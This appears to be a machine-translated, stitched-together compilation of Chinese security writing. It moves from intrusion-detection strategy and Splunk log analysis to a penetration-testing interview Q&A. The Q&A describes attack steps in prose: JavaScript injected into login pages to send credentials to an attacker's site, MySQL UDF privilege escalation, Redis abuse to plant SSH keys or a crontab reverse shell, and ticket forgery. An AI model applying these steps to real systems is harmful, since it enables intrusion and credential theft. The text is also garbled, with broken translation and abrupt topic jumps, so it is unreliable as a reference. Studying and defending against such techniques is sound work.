The end result is invasions that can be found within the ability, and there are always accidents that "happen".

With the poor operation quality of most security teams, there is no turn to fight the strategy.

Of course, once there are resources to follow up these auxiliary work, intrusion detection really needs to fight a strategy.

At this time, there are so many attack techniques, why to choose this scene construction first?

Why do you think that construction is partly enough to meet the current needs?

Why choose to find certain samples and abandon the confrontation of others?

These seemingly subjective things are very tests of professional judgment.

And in front of the leadership it is easy to carry the "lack of responsibility" hat, such as finding excuses for difficulties rather than for the goal, this method has attacked many times, why not to solve, that technique with what said in the scope of vision, but to be solved next year?

The so-called APT is a senior continuous threat.

Since it is advanced, it means that the Trojan is likely to kill, the use of loopholes is also advanced, the attack technique is also very advanced.

So, in fact, APT is about the same invasion that cannot be detected.

However, there are always APT testing products in the industry, solution manufacturers are eating, how do they do?Trojan free, they use sandbox + manual analysis, even if the efficiency is low, or try to make a qualitative, and quickly synchronize the IOC (threat intelligence) to other customers, found that one case, the global customers have the same perception ability.

Traffic encryption deformation confrontation, they use the anomaly detection model, some unknown suspicious IP relations, payload to identify.

Of course, after the identification, but also to the operating personnel to follow up carefully, in order to be qualitative.

If the attack technique is advanced, they will assume that hackers will use harpoons and puddle to execute, and then collect logs in mailbox attachments, PC terminal and other links to analyze user behavior. UEBA tries to find actions different from normal users.
There is also no good way to find the legendary "kill-free" Trojan horse, but we can extract some characteristics of the samples and behavior generated by the known hacking framework.

We can assume that there is already a hacker in control of a certain machine, but when it tries to do lateral diffusion, we have some models to recognize the lateral movement behavior of this host.

There are no 100% APT method in the world.

But we can wait for the team implementing APT to make mistakes. As long as we are deep enough and the information is asymmetric enough, there are absolutely some difficulties not to touch all our bells at all.

Even an attacker who needs to be careful to avoid all the detection logic may give him a psychological deterrent that may delay the opponent's approach to the target and lengthen the time.

And at this time, if he makes mistakes, it's our turn to play.

All the previous high standards, including high coverage, low false positives, forcing every alarm to follow up to the end, "dig three feet" attitude, is waiting for this moment.

Catch a very admirable opponent, that sense of achievement, is still worth aftertaste.

Therefore, I hope that all the security peers engaged in invasion detection can stick to it, even if I have heard countless times "the Wolf came", the next time I see the alarm, you can still use the highest fear to meet the opponent (alarm abuse me thousands of times, I wait to alarm like my first love).

AI's correct posture in the intrusion detection field In the last two years, the story would not be complete without talking about AI.

However, with the popularity of the AI concept, many people have put the traditional data mining, statistical analysis and other ideas, such as classification, prediction, clustering, association and other algorithms in the hat of AI.

In fact, AI is a modern method, with a very practical output in many places.

Take WebShell's text analysis, it may take a long time to break apart the dozens of sample technology types implied in thousands of samples and take longer to build models one by one.

And use AI, do a good job of data target work, training, adjustment, and soon can get a less overfitted laboratory environment model, quickly put into production into the production environment.

A little proficiency can be done in 1-2 months.

In this scenario, the modern method of AI can indeed improve the efficiency several more.

But the problem is that, as mentioned above, the black samples of hackers and WebShell samples are often extremely scarce, and it can not be complete to describe the complete characteristics of hackers.

Therefore, the results of AI output, both false report rate, will be greatly affected by training methods and input samples, we can have the aid of AI, but absolutely can not be completely handed over to AI.

A more common phenomenon in the security field is to turn the scene into a labeling problem, to be sad to solve the labeling solution through a mathematical model.

At this time, the security experts often need to go first, and the algorithm experts continue to keep up, rather than directly let the algorithm experts "fight alone".

For a specific attack scene, how to collect the corresponding invasion data, and think about the difference between this invasion action and the normal behavior. The extraction process of this feature often determines the final effect of the model.

Features determine the upper limit on the effect, while the algorithmic model can only determine how close this upper limit is.

These conditions were gradually resolved with the joint efforts of the security team and the AI engineers.

However, it did not successfully replace the original feature engineering model.

At present, there are many products and articles in the industry in the practice of AI, but unfortunately, most of these articles and products are "superficial" and have no practical operation effect in the real environment.

Once we use the previous standard to ask for it, we will find that although AI is a good thing, but it is definitely just a "semi-finished product".

Real operation, often requires traditional feature engineering and AI in parallel, but also requires continuous iteration.

The future is bound to be the world of AI, but how much intelligence, we may have to pave the way.

I would like to continue to explore on this road with my peers and have more communication and share.

So I wrote down my own idea, for small and medium-sized enterprises, I hope to improve their security system and spend the least money to do security.

For security personnel, I hope you can consider more about the dangers facing enterprises, not just a scanner for a scheduled task and a dirsearch to sleep!

With the continuous advancement of the country and informatization, and the advent of the 5G era, many enterprises begin to slowly make digital transformation. We feel the convenience and speed brought by information to us. Both food, clothing, food, housing and transportation have improved bronze to gold, and the author has deep experience of this!

So in this road of information development, a big problem that cannot be ignored is the safety problem.

The security problems facing enterprises are still very serious, Although your web site uses the https, But this also avoids the impact of the virus on the business, For the country is also put forward that without network security, there is no national security, Increase the rectification of enterprise safety problems, We know that our isometric guarantees from 1.0 to 2.0 have changed, Becmore stricter than ever, Increased the protection of the Internet of Things, cloud and other protection work, It also increased the punishment for some enterprises that did not rectify it, At the same time, different industries have also introduced their own safety management system, I have read the "Bank Safety Management System" is really good, You can have time to see it.

It can be seen that security issues are no longer a business can avoid.

In the face of the huge security system, the author will try to describe and explain to you from different dimensions.

Whether the website structure adopts station and library separation and front and rear separation.

At the same time, the architecture design of the whole layer should also be combined with isinsurance 2.0, so that it is convenient for the isinsurance level in the later stage.

Special attention should be paid to that in the early stage, we should make strict security domain division, security levels of different regions and access strategies between different regions above the firewall.If the above is a company's network topology map, we should design from what aspects, the following will share my personal views with you one by one.

I think enterprises should constantly improve their security and defense capabilities from the following three dimensions.

For basic security, we can do it from four aspects.

A company's most important is data, facing the rational use of dynamic data static data, storage, transmission, data centralized, access management, data leakage, sensitive information leakage, data backup, data security audit, internal file water printing, etc., do data security monitoring, from the attacker into, not, take, do not understand, traceability of different security strategies.

Another very important point is the asset inspection system. Based on the assets reported by business, we should carry out an asset inspection system to carry out an active asset detection, and Only by knowing ourselves and the enemy can we control the overall situation.


Is not detailed here, interested can look at the relevant books, articles, related solution white paper.

Attack direction analysis for attack direction, the most common is through the black box test, because in recent years HW more and more fire, has become a test system security, I probably say here attack commonly used penetration, at the same time as a company information security engineer should also regularly on each business system simulation hacker penetration test, form the effect of an internal attack and defense drill.

Command execution, url jump, arbitrary file upload, directory crossing, Struts2 framework vulnerability, Spring framework vulnerability, SQL injection, xss vulnerability, java code audit environment, software security development, XXE vulnerability, SSRF vulnerability summary without understanding of attack methods, only mastering these attacks and common vulnerabilities and compliance management, can protect our system from the risk of attack.

In addition, we should properly use some surprising tactics, such as confusing tactics, delay tactics, countermeasures, so that to play a high height.

For the network and communication security, we should also pay attention to the network seven-layer model, the security of the corresponding components and protocols at different levels, the application of the communication cryptography between the protocols, and the security of the protocol is not analyzed here.

In a word, safety is a red and blue confrontation thing.

At present, there are many tools for log collection. Xiao Z uses log collection tools: splunk trial data sources currently mainly come from the following ten parts.

List of excel assets, kill soft background log, leaky sweep logging, partial full traffic log, intrusion defense ips,vpn access log, honeypot, core switch log, free online intelligence, internal system login log, etc.

It is mainly input by two parts of data, one is the asset ledger of operation and maintenance managers, which generally is to read xls documents.

The second is the weekly leakage results statistics, which will compare with the asset ledger, count the number of assets changes every week, and find out the differences to ensure the real-time validity of the asset statistics.

The asset module also has the server IP one-click investigation function, which will be mentioned later.

Antivirus software log as an information security monitoring, anti-virus software cannot be absent.

This module focuses on the trends in the number of poisoning hosts in the past week, the distribution of virus species types in the last 24 hours, the newly discovered poisoning host I P information in the last 2 days, and the distribution of virus types and poisoning hosts in the last 5 days.

From the actual experience, the timeliness of killing soft log is very important, of course, not to say that the timeliness of other logs is not important, this is the lesson that Xiao Z learned from the ransomware incident. At that time, the platform alarm was in the work time that day, killing soft is reported the ransomware tiger444.EXE log, but did not do email SMS alarm.

In the first time to get the information, analyze the hacker's attack intention, so missed the earliest block opportunity, leading to the passive situation to the company the next day.

Kill soft log to do day clear, the so-called day qing is the discovery of the day of processing, to find out the root cause of a single server or the interruption of poisoning, it is necessary to expand the scope of investigation.

Without the baptism of several security incidents, after the senior level has a certain awareness of information security, it is difficult to imagine whether the current situation of information security construction will be much better than a few years ago.

Stage 2 Security protection construction is an offensive and defensive, dynamic process-the process of attacking you.

Information security construction is a process of protection system gradually perfect, from the earliest as long as long as a set of anti-virus software is considered safe, gradually evolved to now, with the upgrade of the business, the enterprise gradually equipment to deal with all kinds of new attack of protective equipment, the process of security equipment upgrade, hackers are upgrade the attack technique, won't say you are ready to attack you.

Stage 3 After the safety protection equipment is relatively perfect, there is also the problem of transportation and safe operation-or to attack you when ready.

Even if one day the enterprise has a variety of security protection measures, like the same set of security equipment, different strategy configuration, whether to timely upgrade, different user skills and so on, may have a great impact on the protection effect.

In addition, there are loopholes in the security equipment itself, whether the operation and maintenance management information security management is standardized, the social worker ghost plus 0dayNday and other elements, the physical isolation between the internal net and the outside world is still hacked.

The final conclusion is that the offensive and defensive situation is constantly evolving, but the enterprises' awareness of information safety, safety construction and safety operation have actively follow up the changes of this situation and respond to it, this is a question mark, no one dare to say that safety has achieved full marks.

One of the daily tasks of secure operation is to log in to all devices to see various charts, analyze various logs, and then event processing.

You need to log on each equipment every day to check, and sometimes you need information retrieval. There are efficiency problems, especially in the case of emergency response, and the efficiency problem is prominent.

Some security device logs may exist in their own CF cards, or burst logs exceed the host log storage capacity, and key logs are overwritten and cannot be traced.

Some of the security analysis needs to pay attention to the logs from the network equipment of the operation and maintenance department, such as the attack log recorded by the core switch, and the performance indicators of the server, which are not included in the security devices.

The most important thing is how these security devices are independent, how the correlation between them can be reflected, especially in the emergency response scene, when an attack is in the attack chain, can quickly locate the problem point, at which time point, this time point.

How to use the current situation to maximize the value of the existing safety equipment, not just the accumulation of the quantity and type of safety equipment.

Of course, now there are a lot of security information and event management system, mature open source projects, can achieve this goal, many of these systems are basic preset a variety of modules, are designed, small Z think that can try to build a possible more personalized security visual platform to solve their current problems?

Test data storage platform Xiao Z tries to test splunk as a platform for log collection, further mining the functions inside.

Splunk can support the logs generated by any IT device, which are processed by efficiently indexing the logs and displaying them as statistical and visualized in the SPL language. In addition, it also provides a lot of APP integrated into the log collection platform.

Before the server asset management module is built, or to talk about the importance of information server asset management.

Intranet asset information mining from the perspective of hackers, the first link of the attack chain is information collection.

Information collection in addition to the exposed surface of the enterprise online reconnaissance, but also the information collection after entering the internal network to get the stronghold.

After the hacker gets a server on the Intranet, it will collect stronghold information through various information collection means, excavate various intelligence of the host, and conduct host correlation analysis.

There are just a few examples above. Of course, the whole mining information process can be implemented with automated scripts or tools according to the system architecture, and there are many off-the-shelf tools.

The security operator's information asset information, back to the security operator, the enterprise security management personnel can immediately tell how many servers the company has at the moment?This most basic question may not all be answered immediately.

Xiao z believes that as a protective party responsible for security operation, we should do a good job of information collection, the most basic is to find out their own family, at least to try the information symmetry that hackers can get.

Whoever understands the intranet architecture better has the upper hand in the confrontation. If hackers can gain more information than themselves, it can basically say that protection is flawed.

Therefore, the first step of information security protection: first of all, to find out the assets, this article takes the most basic server assets for example, and try to start from several dimensions.

Clear server coverage as much server assets into the accurately into the platform.

According to the previous safety incidents of the Z Company, there were temporary confirmation of the assets at the emergency response site. I do not know that the person responsible for the assets is, I found the responsible person and forgot the system login password.

Another time is a web server for a long time. After several management handover changes, it has been in the corner area and even has SQL injection loopholes. The situation of asset dead corner is very common, and this kind of forgotten corner is often the best entry point for hacker attack.

The understanding of server asset security attributes is different from financial asset statistics, and we need to understand some of the assets from the perspective of the server. For example, the most basic attribute of the server port, the server opened 1433 port that there may be the risk of being injected into sa weak password lifting power blasting, 7001 port java deserialization weak password risk, etc.

A server is suddenly scanned one day to one more port 12345, further whether the C & C server, so as to further confirm the defects of protection, need sensitivity to understand the properties of the assets from the attacker point of view.

Most of my time is working in a Korean enterprise, from the network engineer to the security engineer, and then to the safety engineer of the current safety director, has been doing the safety construction work of Party A.

From copying Korean information security management strategy, products and technology experience, to the implementation of ISO27001 certification project, level protection system evaluation project, to now 80% open source information security infrastructure construction process, my feeling is important to protect external threats, but internal threat harm and possibility is much higher than external threats, but the enterprise internal security risks and employee reward mechanism rarely implement, and feel no need to do so.

But my former owner has always implemented an internal reward mechanism, which is an important job to improve employee safety awareness.

My information security work enlightenment was two weeks of information security training in Korea.

One of what benefited me most is the content related to the SOC security management platform.

The owner is a financial business company, so the company has invested a lot of resources and time in building the SOC platform.

Their information security SOC platform is built in combination with the IT quality management platform. The backbone system of the architecture level is the Splunk log system, and then it integrates other self-developed process management system, data management system, office management system and so on.

My information security planning is technically the process of designing the SOC operation and management platform.

Operation log collection and analysis of terminal, collection and analysis of network traffic, log collection and analysis of approval link, export log collection and analysis of data, log collection and analysis of operation and maintenance process, log collection and analysis of identity authentication process, and log analysis of regular inspection tasks, etc.

To achieve these needs, it takes a certain amount of time to sort out and design the business rules at the enterprise security level.

Management is all kinds of security management strategies in the ISMS system.

One of the first-level system is the office environmental security management methods and information asset security management methods, I do security audit and review is based on these two system documents.

The most important thing of the secondary system is the information security event management methods and business online security management methods. According to these two systems, IT needs to abide by the requirements of safety transportation, peacekeeping and configuration, the requirements of safety development level, as well as the requirements of emergency response level.

To implement these management requirements, you need to develop the security management Checklist. together with the operation and maintenance team

For example, desktop standardization management, network security management, operation and maintenance configuration management, and so on.

There are also kinds of automatic or manual safety detection tools.

When implementing these programs or projects, I follow the process to sort out the whole process, and then propose my problems and solutions.

When I implemented it, I must show the leaders that reached consensus with the operation and maintenance team or the development team.

Every time a standardized information security plan is issued, listen to everyone's opinions openly and discuss the contents of the plan in private.

After the implementation, then write a summary implementation report, so that after the implementation of several plans, with Yunwei and R & D colleagues gradually established trust and tacit understanding.

The key to doing information security work is to break the hostility with the operation and maintenance team and the R & D team.

There is also a focus on writing and reporting the content of the monthly information security monthly report.

The main contents of the report are the construction of information security management system system, the progress of security infrastructure construction and the content of security audit.

Security audit is in addition to the special audit, the daily audit is the operation log, account management, security reinforcement configuration of the operation and maintenance team, as well as the network traffic analysis.

The following is the information security plan outline compiled by myself by referring to the content of "Internet Security Construction 0 to 1".

For a simple analysis, the 500M can also dig out a lot of information.

It is really too much worry compared to open source tools (ELK,graylog).

Make sure the Linux Firewall is off, and then the browser enters the previous 8000 address to open the login.

For the first time there will be a guided tutorial on how to upload files.

The process all defaults, and uploading the file needs to wait for some time.

Select the access_combined. in the w e b when the Apache log sets up the Source Type

The next step, "check", "submit" is the default.

Show that the file was uploaded successfully, click the "Start Search" button to search for the log data just uploaded.

Search box is put search restrictions, the lower right is the original log, the left is the name of each field, these fields are tools built-in, meet the format of the log will automatically be resolved out of these fields, such as each log beginning has a client ip, is the left clientip, mouse click clientip will see the statistical results, the default is the highest frequency of the first 10 ip.

If you want to count more, you need to query it with the corresponding syntax in the search box.

The splunk Search Language Introduction (SPL syntax) syntax is used in the search box for the purpose of limiting range, statistical required metrics.

These can be transformed and I want to count the 10 and use access2020-09-10.log as source.

If you want to view all the data in the basicserver regardless of date, remove the source condition and keep only the host and sourcetype conditions.

The search box should have at least one condition.

Under the data visualization search bar, there are events, patterns, statistics, and visualization options. The final visualization option can generate charts. It is best to calculate a certain statistical index in the search command, and then click on visualization.

If no calculation indicators directly click the visualization, the configuration will be more cumbersome to generate a chart.

When the bar graph is out, click the format to be configured to display the coordinates ip vertically and look more comfortable.

How the geographic information database of ip addresses can update the statistics The geographical location of ip depends on the geographic information database, and a built-in library is installed, not up-to-date.

The picture below is the user directly connected to the website, clientip is the user's real ip.

How to deal with the crawler By analyzing the log, the following behavior can be judged as the crawler the ip access accounted for the bit high useragent clearly said he is which search engine crawler access the uri obviously does not need so frequent access non-essential early morning access.

The search engine crawler visits the site to include the site data.

There are malicious crawlers who do bad things, in addition to grabbing data and try to land execution scripts etc.

The frequency of crawler access is so high that it can load the site and should be limited to varying degrees depending on the site situation.

Limit the malicious crawler can only seal the other side ip.

Search engine crawlers can be done by configuring the robots.The txt files, as well as in the engine webmaster platform configuration or complaints to limit.

robots.The txt search engine grabbing the data reads the robots. under the root of the site firstThe txt file, the file writes the rules according to the robots protocol, the rules of the file is the rules for the search engine to follow.

Like opening the https://www.taobao.com/robots.Can txt see Taobao's agreement stipulates that Baidu crawler can not climb any data.

According to my experience, Baidu, Google, 360, Bytes, can abide by the agreement, Sogou is very rogue, do not abide by the agreement.

Some of the requested useragent write Baiduspider, but may be posing as a Baidu crawler, useragent can be set on its own.

To determine if an ip is a search engine crawler can use the nslookup or host command.

The domain name information returned by both commands can see if it is a crawler.

Webmaster platform search engines have webmaster platform, there are a lot of related tutorials to help to better use the search engine.

When registering the webmaster platform, prove that you have the management authority of the website, and the verification method is to place the specified file to the root of the website.

After becoming the webmaster can query the index of their own website, query the search engine to the traffic brought to the website and other indicators.

You can also complain about the crawler capture is frequent, set the capture frequency.

Some platforms publish mailboxes to complain.

Seal IP for malicious or do not comply with the robots protocol crawler, can only seal ip.

The website source station is sealed by a firewall, and the CDN acceleration server also provides a sealed ip function.

Website configured with CDN acceleration must seal the I P of xff, because most clientip s are the addresses of the CDN acceleration server that many normal users cannot access normally.

Log analysis is understanding the system from a rational aspect, and the analysis results may subvert the previous inherent cognition of the system.

For development, operation and maintenance, operation can provide valuable information, I suggest that you have the opportunity to try.

If you don't want to ban the crawler ip, you can exclude the crawler ip access records in the search bar, which can both eliminate interference and coexist peacefully with the crawler.

However, at the same time, due to the existence of the firewall, easy to be blocked IP, you can try to adjust the request frequency, the conditional use of the proxy pool for the request.

You can also use DNSlog injection in the principle of putting the results returned by the server in the domain name and reading the log during the DNS resolution to get the desired information.

In the case of the domain control service hash, the client generates a TGS bill as a common domain user and is for a service on a certain machine, the generated silver note can only have access to the service specified in the specified target machine.

Grab the hash of the account number in the domain control directly to generate a T G T note on the client end, then the note is for all the services of all the machines.

docker swarm is a docker host tool that turns docker clusters into a single virtual, using standard Docker API, to facilitate the management and extension of docker clusters, the unauthorized access that can, through url operations, execute docker commands.

Implement the target server container command via docker client, and the docker is run with root permission.

Use the mailbox as the keywords to throw into the search engine.

Use the searched related information to find out other mailboxes and then get common social media accounts.

Social workers find out social accounts, which may identify the administrator's habit of setting a password.

Generate a dedicated dictionary using the existing information.

Query the server side station and the sub-domain name site, because the main station is generally more difficult, so first see if there are any universal cms or other vulnerabilities.

View the server OS version, web middleware to see if there are known vulnerabilities, such as IIS,APACHE,NGINX resolution vulnerability d, view IP, IP address port scanning, vulnerability detection on responding ports, such as rsync, heart zang bleeding, mysql,ftp,ssh weak password, etc.

If open source, the corresponding source code can also be downloaded for code audit.

A significance of a mature and relatively safe CMS?

Which versions of the containers are currently known to have resolution vulnerabilities, for example.

Why is a mysql database station with only one 80 port open?

Changed the port, which was not scanned out.

Get a webshell found site root directory under have.htaccess files, what can we do?

Specific other things, not easy to say in detail, I suggest everyone to search their own statements to play.

Injection vulnerability can only check the account password?

As long as the permission is wide, drag the library out to the old.

Will a safe dog track the variables and find that it is a Trojan horse?

It is according to the code, so it is easy to bypass, as long as the idea is wide, around the dog to joy, but this should not be unchanged.

Choose a read and write directory when lifting, Why try not to use a directory with empty space?

Because e x p execution mostly requires space definition parameters

A server has site A, why does B add t e s t users in the background of A, and access the background of B.

Discovery was also added on the test user?

Can you direct order by to start the injection without and or o r or xor?

The 1 = 1,1 = 2 steps before and/or/xor, are just to determine if the injection point, and if the injection point is determined, save that step.

An anti-injection system, when the injection will prompt: the system detected that you have an illegal injection behavior.

How to use this anti-injection system to take the shell?

Submit a sentence directly in the URL, so that the website also records your sentence into the database file, and then try to find the website profile.

What are the solutions to accessing the random code after uploading the big horse?

What is the point of reviewing the elements of the upload point?

Some sites' upload file type restrictions are implemented at the front end, followed by the addition of the upload type.

Target station to prohibit registered users, find the password to casually enter the user name prompt: "this user does not exist", how do you think to use here?

First blasting the user name, and then use the blasting user name blasting password.

In fact, some sites, in the landing place will also suggest that all places where there is interaction with the database may be injected.

The target station found that the download address of a txt was http://www.test.com/down/down.php?file=/upwdown/1.txt, What do you think about it?

That's the legendary download vulnerability!Try to enter the index. after the file=The php downloads his home page file and then continues finding the other site profile to find out the database password and address of the site.

A gives you a target station and tells you that the root directory the / abc / directory exists and that the editor and admin directory exist under this directory.

Is is your idea?Scan the sensitive files and directories directly under the website secondary directory / abc /.

How does x s s achieve long-term control of the target station with shell?

In the background login office, add a js to record the login account password, and determine whether the log in is successful. If you log in successfully, record the account password to the file with a remote path or send it directly to your own website file.

Insert an XSS script in a file not accessed after logging in.

How do you think you can read out the user's password?

Build one in the win2003 server.What does the zhongzi folder mean?

Hide folders from discovering the tools you upload.

find demo.jsp?With uid=110 injection point, what ideas do you want to get webshell,, which is preferred?

Fout character entities, use HTTP Only to ban JavaScript reading Cookie values, check on input, use the same character encoding browser the Web app.

CSRF is a cross-station request forgery attack, and XSS is one of many means to implement CSRF, due to the lack of confirmation whether it is voluntarily initiated by the critical operation is performed.

Filter out the pages that need to prevent CSRF and then embed Token, to input the password again, check that Referer XXE is an XML external entity injection attack, XML can request local or remote content by calling entities, similar to remote file protection, causing related security issues, such as sensitive file reading.

The XML parsing library strictly forbids the parsing of external entities when called.

What is the difference between CSRF, SSRF and replay attacks?

A CSRF is a cross-station request forgery attack, an SSRF initiated by the client is a server-side request forgery, and a replay attack initiated by the server is to replay the intercepted packet to achieve identity and other authentication.

Speak out of at least three business logic vulnerabilities, and how to fix them?

Use a secure API.

Conduct the Escape escape process of the input special characters.

White lists are used to normalize the input validation methods.

Control over client input does not allow input SQL injection inject relevant special characters.

The server-side filters, escapes, replaces, and removes special characters before submitting the database for an SQL query.

Why do parameterized queries prevent the SQL injection principle: The parameterized query database server does not perform the content of the parameters as part of the sql instruction, only after the database completes the compilation of the sql instruction.

Simply put: the reason why the parameterization prevents injection is that the statement is a statement, the parameter is the parameter, the value of the parameter is not a part of the statement, and the database only runs according to the semantic meaning of the statement.

Blind note is that during the SQL injection attack, the server turned off the error display, and we judge whether there is any SQL injection and utilization simply through the changes in the server return content.

There are two means of blind annotation, one is to verify the injection if the return content of the page is correct.

One is to determine whether there is an injection through the different processing time of the sql statement, here, the function of time delay effect like benchmark,sleep, or the purpose of time delay can be achieved by constructing a joint query table of large Cartesian products.

The wide byte injection generation principle in the database uses the wide character set not considered in WEB, in the WEB layer, since 0XBF27 is two characters, in PHP, since 0x27 single quotation is turned on, 0xbf27 becomes 0xbf5c27, and the data goes into the database.

Solution unifies the character set used by the database, Web application, operating system to avoid parsing differences, preferably set to UTF-8.

Or make the correct escape of the data, such as the use of mysql_real_escape_string + mysql_set_charset.

5.0 The following is a multi-user single operation, 5.0 above is a multi-user multiple operation to do.

XSS1, XSS principle reflection data submitted in the user can construct code to execute, thus realizing attacks such as stealing user information.

The user is required to "click" a malicious link to attack the successfully stored storage XSS will "store" the user input on the server side.

This XSS has a strong stability.

The DOM type, the X S S formed by modifying the DOM node of the page, is called the DOM Based XSS.

X S S between DOM and reflective XSS.

By inducing the user to click, we construct the malicious payload will trigger the XSS.

Detection of reflective XSS Our page should have specific deformity data each time we request a link with payload.

The X S S formed by modifying the DOM node of the page.

Since the X S S is generated by the d o m operation via the js code, we may not even get the corresponding deformed data in response to the request.

The fundamental difference is to me the output point.

DOM and XSS automated or manual testing ideas: find similar document.write, innerHTML assignment, outterHTML assignment, and window.location operation, content after writing javascript:, eval, setTimeout, setInterval, etc.

Find its variable, trace the variable source to observe whether controllable and through the security function.

See the Taoist brother's blog, the idea is to start with the input, observe the process of variable transmission, and finally check whether there is a danger function output, whether there is a security function in the middle.

But this requires a javascript parser otherwise missing some of the parts brought in through js execution.

When answering this question, because the usual detection of customers, is basically based on the function of different functional points plus experience and intuition to detect, different types of XSS detection methods are actually not too subdivided standardized detection methods, so the answer is very bad.

How to quickly discover XSS location 5. How to repair XSS suggested input point check: check the legitimacy of user input data, filter sensitive characters or code escape using filter, and format check for specific types of data.

Inspection for the input points is best implemented on the server side.

When output to the HTML page, encode the output content, when output is in HTML, HTMLEncode, it if output is in the Javascript script

For the variables that use JavascriptEncode that are placed in the quotation marks and escape the danger character, the data part cannot escape outside of the quotation marks and become part of the code.

More stringent methods can also be used, using hexadecimal encoding for all characters outside the numeric letters.

In addition, note that HTML will take precedence over Javascript, and the coding method also needs to be considered clearly. We may have different methods to defend against XSS for different output points, which may be summarized in the later article.

In addition, there is doing HTTPOnly to limit Cookie hijacking.

Production conditions for XSS worms Normally, one is that the page that produces XSS points does not belong to the self pages, and the pages that produce interactive behavior between users may all cause the generation of XSS Worm.

CSRF principle CSRF is a cross-station request forgery attack initiated by the client due to no confirmation voluntarily initiated by the user when the critical operation is performed.

And the referer. can be customized in some versions of FLASH

But if you token, make sure it is random enough and not to leak.

If you do, how to eliminate the problem of referer in header, one is empty referer,, one is referer filtering or imperfect detection.

To prevent this problem, regular rules should be written well in the verified whitelist.

What aspects does token, notice for token tests, and what aspects about t o k e n tests?

Quote a consult senior answer: for token attack, one is the attack on it itself, replay test one-time, analysis encryption rules, check way is correct, etc., the second is combined with information leakage vulnerability to the acquisition of information leakage, combined with combination attack information leak may be cache, log, get, is also likely to use a lot of jump login rely on token, has a jump vulnerability and reflection login hijacking can be combined with other business to describe token security and design how to bypass such as grab a red envelope business.

Server-side request forgery is a security vulnerability constructed by an attacker to form a request initiated by the service side.

In general, SSRF attacks target internal systems that are not accessible from the outnet.

Most of the reasons for SSRF are because the service side provides the ability to obtain data from other server applications and without filtering and restricting the target address.

For example, get web text content from the specified URL address, load pictures of the specified address, download, and so on.

Build a malicious Intranet IP to probe, or attack the remaining services using the remaining supported protocols.

No skipping, limit protocol, internal and external network restrictions, URL restrictions.

The file upload vulnerability principle. Due to the insufficient control or processing defect of the user's file upload part, the user can upload executable dynamic script files to the server over its own authority.

Common upload bypass way front-end js validation: disable js/burp package case double suffix name filtering around pphphp-> php.

The protection file upload directory is set to unexecutable using whitelist judgment file upload type overwrites file names and paths with random numbers.

What is the point of reviewing the elements of the upload point?Some sites' upload file type restrictions are implemented at the front end, followed by the addition of the upload type.

Introduce a script or code that the user can control, and let the server-side perform functions like include() to introduce the files that need to be included through dynamic variables.

The user can control the dynamic variable.

A local file contains a vulnerability that can open and contain local files, known as a local file containing vulnerability.

Common logic loopholes in the financial industry for the financial business is mainly the tampering of data, caused by competition conditions or improper design of wool, order information leakage, the level exceeds the right to view other people's accounts or malicious operation, trading or business steps bypassed.

A middleman attack is a mutually certified attack.

Scheme for vulnerability defense middleman attacks due to the lack of mutual authentication between client and server during the SSL handshake are often based on several techniques.

Use the PKI mutual authentication mechanism, client validation server, server authentication client.

Both of the above examples are only the verification server, which creates a vulnerability in the SSL handshake link, and if using mutual authentication, basically can be stronger mutual authentication.

Delay tests are computed using complex encrypted hash functions to cause a delay in tens of seconds.

If both parties typically take 20 seconds to calculate, and the entire communication takes 60 seconds to reach each other, this indicates the existence of a third-party middleman.

Using other forms of key exchange form ARP deception principles Each host has an ARP cache table that records the correspondence between IP addresses and MAC addresses, while LAN data transfer relies on MAC addresses.

There is a defect in the ARP cache table mechanism, that is, when the request host receives the ARP answer package, it will not verify whether it has sent the ARP request package to the other host, so the IP address and the MAC address is directly saved into the ARP cache table. If the same IP correspondence, the original will be replaced.

This gives the attacker a possible protection from listening to the data transmitted by the host.

DDOS principle uses reasonable requests to cause resource overload, resulting in service unavailable syn torrent principle forged a large number of source IP addresses, respectively send a large number of SYN packages to the server side, when the server will return the SYN/ACK package, because the source address is fake, so the forged IP will not answer, the server did not receive a fake IP response, will retry 3~5 times and wait for a SYNTime, if timeout will discard the connection.

The attacker send SYN requests for this fake source address, and the server-end will consume a lot of resources to handle this semi-connection, while constantly making a S Y N + A C K retry on these IP.

The final result is that the server pays no attention to normal connection requests, resulting in a denial of service.

The attack principle constantly makes normal requests for some more costly application pages to achieve the purpose of consuming service-side resources.

The main idea of SYN Cookie is to assign a "Cookie", to each IP address and count the frequency of access to each IP address.

If a large number of packets from the same IP address are received in a short time, the packets from this IP address are discarded.

The directory does not exist by default which requires us to find the M Y S Q L installation directory using webshell and create the plugin folder under the installation directory and then will udf.The dll file is exported to the directory.


Do the load_file and into dumpfile to export the files to the correct location.

After the execution is successful, you can add an ordinary user, then you can change the command, then conduction the execution to upgrade the user to the administrator permission, and then the 3389 connection is ok.
Redis, by default, is bound to 0.0.0.0:6379, exposing the Redis service to the public web, and, without opening authentication, can cause any user to have unauthorized access to the Redis with access to the target server.

The attacker can use Redis without authorized access to Redis, can successfully write the public key on the Redis server, and then can directly login to the target server using the corresponding private key.

The redis service runs as root accounts.

The redis is authenticated without a password or a weak password.

The redis listens in the 0.0.0.0 public net method.

The Redis' INFO command lets you view the server-related parameters and sensitive information.

pave the way for subsequent penetration of the attacker.

Upload the SSH public key to get the SSH login permission

By crontab rebound shelld, slave primary mode using repair password validation reduction run limit ip / modify port.

Jenkins does not authorized access.

When opening the MongoDB service without downloading webshell using wget, the default has no permission to verify, and you can have access to the database remotely. Users logged in can perform any high-risk operations such as adding, deleting, changing and checking of the database through the default port without password.

These interfaces are closed by default after 2.6.

mongoDB uses by default to listen to web services by default ports and generally does not require remote management through web. It is recommended to disable it.

Memcached is a commonly used key-value cache system, because it has no access control module, the Memcache service open to the public network is easily scanned by the attacker, who can directly read the sensitive information in the Memcached through command interaction.

Back 0.0.0.0:11211 indicates listening on all network cards and there is an memcached unauthorized access vulnerability.

This section then ends the homology policy restricting different sources to read or set the attribute content of the current document.

Difference between different sources: protocol, domain name, subdomain name, IP, port, the above are different namely different sources.

Jsonp security offense and defense technology, how to write Jsonp attack page involves Jsonp's security offensive and defense content JSON hijacking, Callback definition, JSONP content can be defined, Content-type is not json.

JSONP and FLASH and other people use references to know Chuangyu's JSONP security offensive and defense technology.

Referring the answer of a previous upperclassman, random numbers can be generated through some physical systems, such as voltage fluctuations, search time when disk head read and write, noise of air electromagnetic waves, etc.

This part was originally forgotten, but before watching SSL Pinning seems to remember a picture in the mind, struggling for a long time still dare not be sure, then give up.

Symmetric encryption is different from asymmetric encryption, respectively in which aspects 6, TCP/IPTCP the three handshake process, and the corresponding state conversion.

